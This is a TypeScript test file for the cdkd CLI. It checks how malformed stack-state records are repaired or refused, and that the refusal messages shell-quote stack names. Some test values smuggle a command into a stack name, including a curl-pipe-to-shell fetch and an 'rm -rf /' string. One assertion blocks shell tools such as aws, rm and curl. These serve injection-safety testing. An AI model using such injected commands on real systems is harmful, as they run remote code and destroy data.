import { describe, expect, it } from 'vite-plus/test';
import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { execFileSync, spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  STATE_RESOURCES_MALFORMED,
  divergentRecordRegionRefusalMessage,
  hasReadableOutputs,
  hasReadableResources,
  isReadableBag,
  malformedDeployResourcesRefusalMessage,
  malformedDestroyOutputsRefusalMessage,
  malformedDestroyResourcesRefusalMessage,
  malformedExportNamesWarning,
  malformedExportSourceWarning,
  malformedLocalOutputsWarning,
  malformedNestedChildOutputsRefusalMessage,
  malformedOrphanResourcePropertiesRefusalMessage,
  malformedOutputsRefusalMessage,
  malformedOutputsWarning,
  malformedRenderedContainersWarning,
  malformedResourceEntriesRefusalMessage,
  malformedResourceEntriesWarning,
  malformedOrphanRecordsWarning,
  malformedResourcePropertiesRefusalMessage,
  malformedResourcePropertiesWarning,
  malformedResourcesWarning,
  malformedStateRefusalMessage,
  refuseMalformedNestedChildOutputs,
  hasReadableOrphans,
  malformedDestroyOrphansRefusalMessage,
  malformedOrphansRefusalMessage,
  malformedOrphansWarning,
  refuseMalformedOrphans,
  refuseMalformedOrphansForDestroy,
  refuseMalformedOutputs,
  refuseMalformedOutputsForDestroy,
  refuseMalformedResourceEntries,
  refuseMalformedResourceProperties,
  refuseMalformedResourcePropertiesForOrphan,
  refuseMalformedResourcesForDeploy,
  refuseMalformedResourcesForDestroy,
  refuseMalformedState,
  repairMalformedOrphansForReadOnly,
  repairMalformedOutputsForReadOnly,
  repairMalformedResourceEntriesForReadOnly,
  repairMalformedResourcePropertiesForReadOnly,
  repairMalformedResourcesForReadOnly,
  unreadableResourceEntries,
  unreadableResourcePropertyBags,
  type RenderedStateContainer,
  producerRecordKey,
} from '../../../src/state/malformed-resources-bag.js';
import {
  IDENT_MAX_CODE_POINTS,
  STACK_REF_MAX_CODE_POINTS,
  UNRENDERABLE,
  displaySafe,
  truncateCodePoints,
} from '../../../src/utils/display-safe.js';
// For the "offers no destructive command" invariant below: the command names are
// DERIVED from the real Commander tree, never hand-listed.
import { buildProgram } from '../../../src/cli/program.js';

/**
 * What the module's private `safeIdentifier` would render a name as, before
 * its cap. Enough to answer "did the SANITIZED spelling leak into a message
 * that said it would name no target" — the question a quote-keyed check cannot
 * ask, because `shellQuote` leaves a plain identifier bare (go-to-k/cdkd#3439).
 */
function safeIdentifierFor(value: string): string {
  // The CAP too, not just the allowlist. Without it the over-cap row asserted
  // `not.toContain('q'.repeat(5000))` against a message pinned under 2000
  // characters — unfalsifiable by construction, and blind to a leak of the
  // CAPPED `q…q...` spelling, which is the form that would actually appear.
  // One of three rows live is the same shape this fence replaced
  // (go-to-k/cdkd#3439 review).
  return truncateCodePoints(displaySafe(value, { asciiOnly: true }), STACK_REF_MAX_CODE_POINTS)
    .text;
}
import { isMarkedNonRetryable } from '../../../src/deployment/retryable-errors.js';
import { CdkdError } from '../../../src/utils/error-handler.js';
import type { StackState } from '../../../src/types/state.js';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

/**
 * Source with comments removed. Every source-shape assertion below reads THIS,
 * because one of them was already satisfied by prose: a
 * `toContain('!opts.dryRun')` matched a doc comment quoting the gate it meant
 * to pin, so deleting the runtime gate and keeping the comment left the fence
 * green. A grep over un-stripped source asserts that someone WROTE a string,
 * not that the code DOES anything.
 */
function code(relPath: string): string {
  return readFileSync(join(repoRoot, relPath), 'utf8')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/.*$/gm, '$1');
}

/**
 * The value on one of the orphan refusal's labelled trailing lines
 * (`Object key:` / `State bucket:` / a command label), or `undefined` when the
 * message prints no such line.
 */
function lineValue(text: string, label: string): string | undefined {
  const escaped = label.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  return new RegExp(`^${escaped}: (.*)$`, 'm').exec(text)?.[1];
}

function state(resources: unknown): StackState {
  return {
    version: 10,
    stackName: 'S',
    region: 'us-east-1',
    resources: resources as StackState['resources'],
    outputs: {},
    lastModified: 0,
  };
}

/** Every shape a hand-edited record can carry that is not a readable bag. */
const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
  ['null', null],
  ['absent', undefined],
  ['an array', []],
  ['a number', 5],
  ['zero', 0],
  ['negative zero', -0],
  ['Infinity', Infinity],
  ['-Infinity', -Infinity],
  ['a string', 'ab'],
  // JSON carries booleans too, and a mutant accepting them survived every other
  // case here: `Object.entries(true)` is `[]`, so nothing crashes and nothing
  // fabricates — the record is simply reported as an empty stack, silently.
  ['true', true],
  ['false', false],
];

describe('repairMalformedResourcesForReadOnly', () => {
  for (const [label, value] of UNREADABLE) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = state(value);
      expect(repairMalformedResourcesForReadOnly(s)).toBe(true);
      expect(s.resources).toEqual({});
    });
  }

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { A: { physicalId: 'p', resourceType: 'T', properties: {} } };
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    // The SAME object, not a copy: callers hold the backend's reference and an
    // etag-paired saveState must write back the record that was read.
    expect(s.resources).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate deployed-nothing record', () => {
    const bag = {};
    const s = state(bag);
    expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
    expect(s.resources).toBe(bag);
  });
});

/**
 * Every shape a hand-edited ENTRY can carry that is not a readable record.
 *
 * Kept apart from {@link UNREADABLE} even though the predicate is the same one:
 * `undefined` is NOT here. An `undefined` value does not survive
 * `JSON.parse`, so it cannot arrive from a stored record — and an entry
 * explicitly assigned `undefined` in memory would be dropped by the next
 * `JSON.stringify` anyway. Listing it would fence a shape no record has.
 */
const UNREADABLE_ENTRY: ReadonlyArray<readonly [string, unknown]> = [
  ['null', null],
  ['an array', []],
  ['a number', 5],
  ['zero', 0],
  ['negative zero', -0],
  ['Infinity', Infinity],
  ['-Infinity', -Infinity],
  ['a string', 'ab'],
  // Why THESE: each is a shape `JSON.parse` really produces and whose
  // bypass would be INVISIBLE in output. The empty string and the two
  // zeroes are falsy, so a truthiness check lets them through, and `-0`
  // additionally survives a `=== 0` exemption written as `Object.is`.
  // The infinities come from `JSON.parse('1e400')`, which is a number a
  // hand-edited record can hold. The two list sizes separate a
  // SHAPE-based guard from a LENGTH-based one — both are dereferenced
  // the same way, so only a length-dependent bypass tells them apart.
  // `NaN` is absent because `JSON.parse` cannot produce it.
  ['an empty string', ''],
  ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
  // An OBJECT with no resource type. It passes an object-ness test and then
  // throws on `resource.resourceType.startsWith(...)`, which is why the entry
  // predicate asks for the type rather than only for object-ness.
  ['an object with no resourceType', { physicalId: 'p', properties: {} }],
  ['true', true],
  ['false', false],
];

const HEALTHY = { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} };

describe('unreadableResourceEntries', () => {
  for (const [label, value] of UNREADABLE_ENTRY) {
    it(`names an entry that is ${label}, and only that entry`, () => {
      const names = unreadableResourceEntries(state({ Good: HEALTHY, Bad: value }));
      expect(names).toEqual(['Bad']);
    });
  }

  it('names EVERY unreadable entry, not the first one', () => {
    // A `.slice(0, 1)` on the result survived every other case here, because
    // each fixture carried exactly one bad entry. The consequence is not
    // cosmetic: the repair below removes only what this returns, so a second
    // `null` would survive it and crash the walk the repair exists to protect.
    const names = unreadableResourceEntries(
      state({ A: null, Good: HEALTHY, B: 'ab', C: [], D: 5, E: true })
    );
    expect([...names].sort()).toEqual(['A', 'B', 'C', 'D', 'E']);
  });

  it('names nothing for a healthy bag, empty included', () => {
    expect(unreadableResourceEntries(state({}))).toEqual([]);
    expect(unreadableResourceEntries(state({ A: HEALTHY }))).toEqual([]);
  });

  // The shapes that DISCRIMINATE, and they are the POPULATED ones — a fact the
  // fixtures have to carry, not the comment. `Object.entries` of a string or of
  // a non-empty array yields one pair per element, so a guard narrowed to leave
  // either shape through reports "unreadable entries" named `0`, `1`, … — rows
  // that do not exist, in a message whose whole job is to name real ones.
  for (const [label, value] of [
    ['a STRING', 'ab'],
    ['a POPULATED list of non-objects', ['a', 'b']],
  ] as const) {
    it(`answers [] for ${label} bag rather than inventing one id per element`, () => {
      expect(unreadableResourceEntries(state(value))).toEqual([]);
    });
  }

  for (const [label, value] of UNREADABLE) {
    it(`answers [] for a bag that is ${label}`, () => {
      // `null` and `absent` discriminate too — `Object.entries(null)` THROWS, so
      // a guard narrowed away from them reds here rather than fabricating. The
      // genuinely inert members are `5`, `true`, `false` and the EMPTY `[]`,
      // whose `Object.entries` is `[]` either way. Nothing here pins THOSE, and
      // nothing can: a guard bypassed for them produces the identical output.
      // They are listed so a future widening of the predicate is measured
      // against the whole population rather than against the two shapes that
      // bite.
      expect(unreadableResourceEntries(state(value))).toEqual([]);
    });
  }

  it('keeps its bag guard, structurally — the inert shapes have no other fence', () => {
    // The one thing that CAN be asserted for `5` / `true` / `false` / `[]`: that
    // the early return is still written. No assertion over this helper's output
    // distinguishes a guard that ran from one bypassed for those shapes, so
    // without this a narrowing like
    // `typeof bag !== 'boolean' && !hasReadableResources(state)` is caught by
    // nothing at all. Read from comment-stripped source, so the prose above the
    // guard cannot satisfy it.
    const module = code('src/state/malformed-resources-bag.ts');
    const fn = module.slice(module.indexOf('export function unreadableResourceEntries'));
    const body = fn.slice(0, fn.indexOf('\n}\n'));
    // UNCONDITIONAL, and that is the part a presence-and-position check misses:
    // wrapping the guard in `if (typeof state.resources !== 'boolean')` keeps it
    // present, keeps it above the walk, and skips it for exactly the shapes no
    // output assertion can see. So the guard must be the FIRST statement of the
    // body — nothing can gate what runs first.
    const statements = body
      .slice(body.indexOf('{') + 1)
      .split('\n')
      .map((line) => line.trim())
      .filter(Boolean);
    expect(
      statements[0],
      'the bag guard is no longer the FIRST statement of unreadableResourceEntries, so something ' +
        'can now gate it — for a boolean or numeric bag no assertion over the output would notice.'
    ).toBe('if (!hasReadableResources(state)) return [];');
    // ...and it still precedes the walk it protects.
    expect(body.indexOf('hasReadableResources(')).toBeLessThan(body.indexOf('Object.entries('));
  });

  it('agrees with the bag predicate on every shape it rejects', () => {
    // A RELATION between the two predicates, and the honest limit is worth
    // stating: for a shape whose `Object.entries` is inert — `5`, `true`,
    // `false`, an EMPTY `[]` — no assertion over this helper's OUTPUT can tell
    // a guard that ran from one that was bypassed, because the fallthrough
    // produces `[]` either way. A narrowing like
    // `typeof bag !== 'boolean' && !hasReadableResources(bag)` therefore
    // survives this case, and that is a property of the shapes rather than of
    // the case. What this DOES pin is that the two predicates still answer
    // together, so a future widening of one is measured against the other
    // rather than against nothing; the POPULATED cases above are what pin the
    // guard executing.
    for (const [label, value] of UNREADABLE) {
      const s = state(value);
      expect(hasReadableResources(s), `${label} is no longer an unreadable bag`).toBe(false);
      expect(unreadableResourceEntries(s), `${label} now yields entry names`).toEqual([]);
    }
  });
});

describe('refuseMalformedResourceEntries', () => {
  for (const [label, value] of UNREADABLE_ENTRY) {
    it(`refuses an entry that is ${label}, naming it, with a named code`, () => {
      let thrown: unknown;
      try {
        refuseMalformedResourceEntries(
          state({ Good: HEALTHY, BrokenRow: value }),
          'MyStack',
          'eu-west-1'
        );
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      // The logical id is the whole point: `refuseMalformedState`'s text can
      // only say "the bag", while a reader of THIS one has to know which row to
      // open.
      expect((thrown as CdkdError).message).toContain('BrokenRow');
      expect((thrown as CdkdError).message).toContain('MyStack');
      expect((thrown as CdkdError).message).toContain('WRITE');
      // The REGION reaches the remedy as the region, not as a second copy of
      // the stack name: passing `stackName` twice left every other assertion
      // green and pointed the command at a record in the wrong place. Distinct
      // values on both sides are what make this a discriminator.
      expect((thrown as CdkdError).message).toContain(
        'cdkd state show MyStack --stack-region eu-west-1 --json'
      );
      // ...and must not name the healthy sibling, or the remedy sends the user
      // to a row that is fine.
      expect((thrown as CdkdError).message).not.toContain('Good');
    });
  }

  it('forwards the WHOLE list to the message, not the first entry', () => {
    // The refusal's own hop, which the discovery and repair cases do not cover:
    // a `.slice(0, 1)` between the helper and the message survived all of them,
    // and the user would then repair one row and hit the next on the re-run.
    // Six rows against the five-name cap, so the count, the names AND the
    // overflow summary all have to come from the full list.
    const bag: Record<string, unknown> = { Good: HEALTHY };
    for (const id of ['A1', 'B2', 'C3', 'D4', 'E5', 'F6']) bag[id] = null;
    let thrown: unknown;
    try {
      refuseMalformedResourceEntries(state(bag), 'S', 'r');
    } catch (err) {
      thrown = err;
    }
    const message = (thrown as CdkdError).message;
    expect(message).toContain('6 resource record(s)');
    for (const id of ['A1', 'B2', 'C3', 'D4', 'E5']) expect(message).toContain(id);
    expect(message).toContain('and 1 more');
  });

  it('passes a healthy bag through, empty included', () => {
    expect(() => refuseMalformedResourceEntries(state({}), 'S', 'r')).not.toThrow();
    expect(() => refuseMalformedResourceEntries(state({ A: HEALTHY }), 'S', 'r')).not.toThrow();
  });

  it('stays silent on an unreadable BAG — that is the other refusal to make', () => {
    // Composition rule, asserted rather than left to a comment. A caller pairs
    // this with `refuseMalformedState`; if this one ALSO threw for a bag it
    // would have to invent row names from a shape that has none, and the
    // message's whole job is to name real ones.
    for (const [, value] of UNREADABLE) {
      expect(() => refuseMalformedResourceEntries(state(value), 'S', 'r')).not.toThrow();
    }
  });

  it('does NOT mutate the record it refuses', () => {
    // The refusal's value over a repair is that the evidence SURVIVES, and
    // nothing else here pins it: swapping `unreadableResourceEntries` for the
    // read-only repair inside the refusal still throws, still names the row,
    // and deletes it from the record on the way out — every other case in this
    // file stays green.
    const bad = null;
    const bag: Record<string, unknown> = { Good: HEALTHY, BrokenRow: bad };
    const s = state(bag);
    expect(() => refuseMalformedResourceEntries(s, 'S', 'r')).toThrow();
    // The same bag object, the same keys, the same values by identity.
    expect(s.resources).toBe(bag);
    expect(Object.keys(s.resources)).toEqual(['Good', 'BrokenRow']);
    expect((s.resources as Record<string, unknown>)['BrokenRow']).toBe(bad);
    expect(s.resources['Good']).toBe(HEALTHY);
  });
});

describe('repairMalformedResourceEntriesForReadOnly', () => {
  for (const [label, value] of UNREADABLE_ENTRY) {
    it(`drops an entry that is ${label} and reports it, keeping the readable ones`, () => {
      const s = state({ Good: HEALTHY, Bad: value });
      expect(repairMalformedResourceEntriesForReadOnly(s)).toEqual(['Bad']);
      // The survivor is the SAME object — a read-only repair must not rebuild
      // the records it keeps.
      expect(s.resources['Good']).toBe(HEALTHY);
      expect(Object.keys(s.resources)).toEqual(['Good']);
    });
  }

  it('drops EVERY unreadable entry, leaving a bag the walk can finish', () => {
    // The half that matters at the call sites: a repair removing only the first
    // bad row leaves the next one to throw in the loop below it, which is the
    // failure this whole change is about — moved one entry along.
    const s = state({ A: null, Good: HEALTHY, B: 'ab', C: [], D: 5, E: false });
    expect([...repairMalformedResourceEntriesForReadOnly(s)].sort()).toEqual([
      'A',
      'B',
      'C',
      'D',
      'E',
    ]);
    expect(Object.keys(s.resources)).toEqual(['Good']);
    // Every survivor is readable, so a walk over what is left cannot throw.
    for (const entry of Object.values(s.resources)) expect(isReadableBag(entry)).toBe(true);
  });

  it('drops nothing from a healthy bag', () => {
    const bag = { A: HEALTHY };
    const s = state(bag);
    expect(repairMalformedResourceEntriesForReadOnly(s)).toEqual([]);
    expect(s.resources).toBe(bag);
  });
});

describe('the orphans CONTAINER (issue go-to-k/cdkd#3379)', () => {
  const withOrphans = (orphans: unknown): StackState =>
    ({ ...state({}), orphans }) as unknown as StackState;
  // Every shape `parseStateBody` lets through. `{"length": 1}` is here because
  // a `.length`-keyed guard ACCEPTS it while every reader that walks the
  // container still fails — the shape that separates the two tests.
  const UNREADABLE: Array<[string, unknown]> = [
    ['a string', 'abc'],
    ['a number', 5],
    ['a plain object', {}],
    ['an object carrying length', { length: 1 }],
    ['null', null],
    ['a boolean', true],
  ];

  describe('hasReadableOrphans', () => {
    it.each(UNREADABLE)('rejects %s', (_label, value) => {
      expect(hasReadableOrphans(withOrphans(value))).toBe(false);
    });

    it('accepts a list, empty or not', () => {
      expect(hasReadableOrphans(withOrphans([]))).toBe(true);
      expect(hasReadableOrphans(withOrphans([{ logicalId: 'A' }]))).toBe(true);
    });

    it('accepts an ABSENT container, which is the ordinary record', () => {
      // A stack that never had a failed deploy has no orphan list at all, and
      // `JSON.stringify` drops the key when it is undefined — so warning here
      // would fire on almost every record in a bucket.
      expect(hasReadableOrphans(state({}))).toBe(true);
      expect(hasReadableOrphans(withOrphans(undefined))).toBe(true);
    });

    it('says nothing about the ENTRIES, which are go-to-k/cdkd#3344 question', () => {
      // The container is a list; its rows are not this predicate's business.
      expect(hasReadableOrphans(withOrphans([null, 'x', 5]))).toBe(true);
    });
  });

  describe('repairMalformedOrphansForReadOnly', () => {
    it.each(UNREADABLE)('replaces %s with an empty list and reports it', (_label, value) => {
      const s = withOrphans(value);
      expect(repairMalformedOrphansForReadOnly(s)).toBe(true);
      expect(s.orphans).toEqual([]);
    });

    it('leaves a readable container untouched and reports nothing', () => {
      const records = [{ logicalId: 'A' }] as unknown as StackState['orphans'];
      const s = withOrphans(records);
      expect(repairMalformedOrphansForReadOnly(s)).toBe(false);
      expect(s.orphans).toBe(records);
      const absent = state({});
      expect(repairMalformedOrphansForReadOnly(absent)).toBe(false);
      // Absent stays ABSENT rather than becoming `[]`: materializing the key
      // would be a change `cdkd scrub`'s write gate could then persist.
      expect('orphans' in absent).toBe(false);
    });
  });

  describe('refuseMalformedOrphans', () => {
    it.each(UNREADABLE)('refuses %s, naming the container', (_label, value) => {
      let thrown: unknown;
      try {
        refuseMalformedOrphans(withOrphans(value), 'MyStack', 'us-east-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
      // The CONTAINER by name: a `resources` message over an intact resource
      // map tells the reader not to run `cdkd deploy` for a reason that does
      // not hold.
      expect((thrown as CdkdError).message).toContain("'orphans'");
      expect((thrown as CdkdError).message).not.toContain("'resources' map");
    });

    it('passes a readable or absent container', () => {
      expect(() => refuseMalformedOrphans(withOrphans([]), 'S', 'r')).not.toThrow();
      expect(() => refuseMalformedOrphans(state({}), 'S', 'r')).not.toThrow();
    });
  });

  describe('the two texts', () => {
    it('name the stack, the region and the inspect command, which goes LAST', () => {
      for (const message of [
        malformedOrphansWarning('MyStack', 'us-east-1'),
        malformedOrphansRefusalMessage('MyStack', 'us-east-1'),
      ]) {
        expect(message).toContain('MyStack');
        expect(message).toContain('us-east-1');
        // `shellQuote` leaves a name needing no quoting unquoted; what this
        // pins is that the pasteable command ENDS the message, unwrapped.
        expect(
          message.endsWith('cdkd state show MyStack --stack-region us-east-1 --json'),
          message
        ).toBe(true);
      }
    });

    it('shell-quote a hostile identity and stay on one line', () => {
      const evil = "a'; curl http://x|sh; echo '";
      for (const message of [
        malformedOrphansWarning(evil, 'us-east-1'),
        malformedOrphansRefusalMessage(evil, 'us-east-1'),
      ]) {
        // Quoted, not merely present: the raw name followed by the next flag is
        // what a paste would execute.
        expect(message).not.toContain(`${evil} --stack-region`);
        expect(message.split('\n')).toHaveLength(1);
      }
      expect(malformedOrphansWarning(String.fromCharCode(0x00), 'r')).toContain(UNRENDERABLE);
    });

    it('the WRITER text names the hand-edit hazard and invokes only the READ command', () => {
      // Security review of the go-to-k/cdkd#3379 maintainer round: the first cut
      // of this clause said the record "stays damaged until you rewrite or
      // remove it yourself", which reads as "cdkd offers nothing" and steers an
      // operator to edit the object in S3 — where rewriting the container to
      // `[]` erases the evidence this refusal exists to protect, bypassing the
      // lock and the If-Match on every supported write. So the clause names
      // that hazard rather than leaving the reader to find it.
      const m = malformedOrphansRefusalMessage('MyStack', 'us-east-1');
      expect(m).toContain('no cdkd command repairs this container');
      // The WARNING, not just the notation: keying on `[]` alone left the
      // consequence clause deletable with every assertion green (maintainer
      // proxy pass, round 2).
      expect(m, 'the hand-edit hazard is not named').toContain('[]');
      expect(m).toContain('discards the very evidence this refusal is protecting');
      // And it offers NO command that deletes — asserted as the INVARIANT
      // rather than as one spelling, because excluding `cdkd state orphan`
      // alone left an inserted `aws s3 rm` green. Exactly one command-shaped
      // token, and it is the read below. A removal route belongs to the DESTROY
      // sibling, which owes it because it is refusing a cleanup; here a
      // deleting command would need this message to gain that sibling's
      // exactness split, since a sanitized name can match a HEALTHY record.
      // DERIVED from the CLI's own command inventory, whitespace-normalised, and
      // asserted as the WHOLE list rather than per spelling. Three weaker cuts
      // were each green under a mutation (maintainer proxy pass): excluding only
      // `cdkd state orphan` admitted `aws s3 rm`; a hand list of subcommands
      // admitted `cdkd gc`; and a `toContain` check admitted `cdkd  state
      // orphan` with two spaces, as well as a SECOND copy of the allowed read.
      // The floors are what stop a broken import from making this vacuous.
      const program = buildProgram();
      const topLevel = program.commands.map((c) => c.name());
      const stateSubs = (program.commands.find((c) => c.name() === 'state')?.commands ?? []).map(
        (c) => c.name()
      );
      expect(topLevel.length).toBeGreaterThan(10);
      expect(stateSubs.length).toBeGreaterThan(5);
      // Quotes stripped as well as whitespace collapsed: `cdkd 'state' orphan` executes as
      // `state orphan`, and a bare-token regex misses it. What this pins is the message's
      // command inventory under that normalisation — not every conceivable shell spelling,
      // which no string assertion can reach.
      const flat = m.replace(/['"]/g, '').replace(/\s+/g, ' ');
      const invoked = [...flat.matchAll(/cdkd\s+([a-z][a-z-]*)(?:\s+([a-z][a-z-]*))?/g)]
        .filter((hit) => topLevel.includes(hit[1]!))
        .map((hit) => (hit[1] === 'state' ? `state ${hit[2]}` : hit[1]!));
      expect(invoked, 'the refusal invokes a command other than the one READ').toEqual([
        'state show',
      ]);
      // ...and no foreign tool either, which is the other half of "offers no
      // destructive command" (an inserted `aws s3 rm` was green before this).
      expect(flat).not.toMatch(/\b(?:aws|rm|curl|kubectl|sh)\s+\S/);
      // The one PASTEABLE command still ends the message, unwrapped, so the
      // added sentence did not move it off the tail.
      expect(m.endsWith('cdkd state show MyStack --stack-region us-east-1 --json')).toBe(true);
      expect(m.split('\n')).toHaveLength(1);
    });

    it('the DESTROY text says what a destroy does, and names the way out', () => {
      const destroy = malformedDestroyOrphansRefusalMessage('MyStack', 'us-east-1');
      // A destroy writes nothing back, so the write-back mechanism the other
      // refusal describes would be a false sentence here.
      expect(destroy).not.toContain('written back');
      expect(destroy).toContain('DELETES state');
      // And it answers "then how do I get rid of the record?", which the
      // sibling destroy refusal answers the same way. `cdkd state orphan`
      // reads no orphans container, so the pointer is sound.
      expect(destroy).toContain('cdkd state orphan');
      // It also owes what every other message in this module ends ON: how to
      // READ the record it is refusing. The first cut dropped it, and the
      // second put it MID-SENTENCE, one space from the next clause — so a
      // line-select paste handed `cdkd state show` six junk positional
      // arguments. `endsWith`, not `toContain`, is what pins the placement.
      expect(destroy.endsWith('cdkd state show MyStack --stack-region us-east-1 --json')).toBe(
        true
      );
      // ...and the sibling's legacy-record clause, because for such a record
      // the `--stack-region` flag must be OMITTED or it selects nothing.
      expect(destroy).toContain('legacy record');
      expect(destroy.split('\n')).toHaveLength(1);
    });

    it('the DESTROY text withholds the target when the identity does not render exactly', () => {
      // The same split `malformedDestroyResourcesRefusalMessage` makes: a
      // sanitized name may match a HEALTHY sibling record, so a command built
      // from it would send the operator to delete the wrong one.
      // A name sanitizing CHANGES — an ESC here. A quoted-but-faithful name
      // (`a'; rm -rf /; #`) renders exactly and keeps the target, which is the
      // sibling's behaviour too.
      const withheld = malformedDestroyOrphansRefusalMessage(`a${String.fromCharCode(0x1b)}b`, 'us-east-1');
      expect(withheld).not.toContain('cdkd state orphan <stack>');
      expect(withheld).toContain('cdkd state list --long');
      expect(withheld.split('\n')).toHaveLength(1);
      // It reads as a SENTENCE: the no-identity clause ends open, so a second
      // sentence bolted onto it renders with no verb — on the arm a planted
      // identity reaches.
      expect(withheld.startsWith('The state record this command loaded has no readable')).toBe(true);
    });

    it('differ, because continuing costs something different from refusing', () => {
      // The module's rule: one text per consequence. A shared text here would
      // tell a read-only reader that the command "refuses", which it does not.
      expect(malformedOrphansWarning('S', 'r')).not.toBe(malformedOrphansRefusalMessage('S', 'r'));
      expect(malformedOrphansWarning('S', 'r')).toContain('Continuing with it EMPTY');
      expect(malformedOrphansRefusalMessage('S', 'r')).toContain('refuses');
    });
  });
});

describe('repairMalformedOutputsForReadOnly (issue go-to-k/cdkd#3189)', () => {
  /**
   * The bag under test is `outputs`, so the record's `resources` bag is healthy
   * in every case here — the two are independent containers and a record can be
   * malformed in either alone.
   */
  /**
   * A POPULATED resources bag, not `{}`. The sibling-untouched assertion below
   * compares against this value, and `{}` is also what a wrongful wipe
   * produces — so with an empty bag that assertion could not fail (review of
   * go-to-k/cdkd#3194).
   */
  const HEALTHY_RESOURCES = {
    R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: { Name: 'b' } },
  };

  function withOutputs(outputs: unknown): StackState {
    const s = state(structuredClone(HEALTHY_RESOURCES));
    s.outputs = outputs as StackState['outputs'];
    return s;
  }

  /**
   * The shared table MINUS `absent`, which this half exempts. See the case
   * below and the function's own note: an absent bag never reaches either
   * stored-bag lookup (both gate on `!== undefined`), so it is inert, and a
   * record with no `outputs` is one `cdkd scrub` round-trips deliberately.
   * `null` stays in — it passes that gate and throws.
   */
  const UNREADABLE_OUTPUTS = UNREADABLE.filter(([label]) => label !== 'absent');

  it('excludes exactly ONE shape from the shared table, and names it', () => {
    // Derived, not re-spelled: a shape added to `UNREADABLE` lands in the loop
    // below automatically, and this case reds if the exemption ever widens
    // silently to cover it too.
    expect(UNREADABLE.length - UNREADABLE_OUTPUTS.length).toBe(1);
    expect(UNREADABLE_OUTPUTS.map(([label]) => label)).not.toContain('absent');
  });

  for (const [label, value] of UNREADABLE_OUTPUTS) {
    it(`repairs ${label} and reports that it did`, () => {
      const s = withOutputs(value);
      expect(repairMalformedOutputsForReadOnly(s)).toBe(true);
      expect(s.outputs).toEqual({});
      // The SIBLING container is untouched — the repair is per-bag, so a record
      // whose outputs are damaged keeps whatever its resource map held. Compared
      // against a POPULATED bag: `{}` here would be satisfied by a wrongful wipe
      // too, which is the shape this assertion shipped in first.
      expect(s.resources).toEqual(HEALTHY_RESOURCES);
    });
  }

  it('leaves an ABSENT bag alone — a record with no outputs is one cdkd supports', () => {
    // The divergence from the `resources` half, and from `isReadableBag`'s own
    // verdict. `cdkd scrub` refuses to materialize `{}` over such a record
    // (`src/cli/commands/scrub.ts`), and the deploy's failure-path saves write
    // `outputs: currentState.outputs`, which `JSON.stringify` DROPS when
    // undefined — so warning here would fire on healthy state. Both stored-bag
    // lookups in `resolveTemplateOutputs` gate on `!== undefined`, so nothing
    // on the diff path dereferences it.
    const s = withOutputs(undefined);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    // ...and NOT materialized: the repair must not give the record a bag it
    // did not have, even in memory, or a later reader cannot tell the two
    // apart.
    expect(s.outputs).toBeUndefined();
  });

  it('leaves a populated bag byte-identical and reports no repair', () => {
    const bag = { Endpoint: 'https://x', 'Stack:Export': ['a', 'b'] };
    const s = withOutputs(bag);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    // The SAME object: a diff compares against the values the record holds, and
    // a copy here would silently drop a `__proto__` key the record can carry.
    expect(s.outputs).toBe(bag);
  });

  it('leaves an EMPTY bag alone — {} is a legitimate exports-nothing record', () => {
    const bag = {};
    const s = withOutputs(bag);
    expect(repairMalformedOutputsForReadOnly(s)).toBe(false);
    expect(s.outputs).toBe(bag);
  });

  it('agrees with the resources half on every shape BUT absent, which is the only divergence', () => {
    // Not a tautology through one shared helper: this compares the two EXPORTED
    // entry points over every shape, which is what reds if either one grows its
    // own inline test (the drift `isReadableBag` exists to prevent) — and the
    // `absent` row is asserted as a DISAGREEMENT rather than skipped, so the
    // exemption cannot spread to the resources half unnoticed.
    for (const [label, value] of UNREADABLE) {
      const outputsVerdict = repairMalformedOutputsForReadOnly(withOutputs(value));
      const resourcesVerdict = repairMalformedResourcesForReadOnly(state(value));
      if (label === 'absent') {
        expect(resourcesVerdict, 'an absent resources bag is still a defect').toBe(true);
        expect(outputsVerdict, 'an absent outputs bag is not').toBe(false);
        continue;
      }
      expect(outputsVerdict, label).toBe(resourcesVerdict);
    }
  });
});

/**
 * The WRITE-capable half of the `outputs` container (issue go-to-k/cdkd#3192)
 * — the opposite answer from `repairMalformedOutputsForReadOnly` above, for
 * the same shapes, and the asymmetry IS the fix: repairing a bag and then
 * saving it is the laundering this refusal exists to stop.
 */
describe('refuseMalformedOutputs + hasReadableOutputs (issue go-to-k/cdkd#3192)', () => {
  const HEALTHY_RESOURCES = {
    R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: { Name: 'b' } },
  };

  function withOutputs(outputs: unknown): StackState {
    const s = state(structuredClone(HEALTHY_RESOURCES));
    s.outputs = outputs as StackState['outputs'];
    return s;
  }

  /** The shared table MINUS `absent`, which this half exempts — see below. */
  const UNREADABLE_OUTPUTS = UNREADABLE.filter(([label]) => label !== 'absent');

  for (const [label, value] of UNREADABLE_OUTPUTS) {
    it(`REFUSES ${label} with the shared code`, () => {
      let thrown: unknown;
      try {
        refuseMalformedOutputs(withOutputs(value), 'MyStack', 'eu-west-1');
      } catch (err) {
        thrown = err;
      }
      expect(thrown, `a ${label} outputs bag was not refused`).toBeInstanceOf(CdkdError);
      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
